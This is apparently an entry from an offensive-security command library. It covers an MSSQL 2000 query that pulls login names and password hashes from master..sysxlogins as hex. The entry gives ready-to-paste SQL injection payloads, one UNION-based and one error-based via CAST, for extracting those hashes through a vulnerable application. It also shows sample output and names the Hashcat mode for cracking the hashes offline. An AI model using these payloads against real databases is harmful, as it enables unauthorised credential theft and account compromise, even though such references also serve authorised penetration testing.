---
id: a3ac7dd5-b5de-4b34-8c81-e0b1c0e1a8fb
name: mssql-2000-select-name-hex-password-sysxlogins
type: command
executor: sql
data: 'SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins'
output: null
created_at: '2023-04-06T03:56:33.738091+00:00'
updated_at: '2023-04-10T20:22:43.467446+00:00'
platforms:
  - Windows
tags:
  - mssql
  - credential-theft
verified: true
validated: true
---

# mssql-2000-select-name-hex-password-sysxlogins

## Command

```sql
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
```

## Description

This SQL command retrieves usernames and converts password varbinary fields to hexadecimal strings using fn_varbintohexstr in MSSQL 2000. Ideal for error-based SQL injection where hex format aids in extracting and cracking hashes offline.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Static query; embed in SQLi payloads. | N/A |

## Examples

### Basic Usage

`' UNION SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins --`

### With Error Conversion

Use in CAST for error output: `' AND 1=CAST((SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins) AS varchar(8000)) --`

## Expected Output

name | master.dbo.fn_varbintohexstr(password)
---|---
sa | 0x010500000000000015000000A8B6DF...
user1 | 0x010100000000000000000000...

Hex strings are ready for tools like Hashcat (mode 1731 for MSSQL).

## Related

- [[procedures/MSSQL-Credential-Theft-via-SQL-Injection]]
- [[commands/mssql-2000-select-name-password-sysxlogins]]
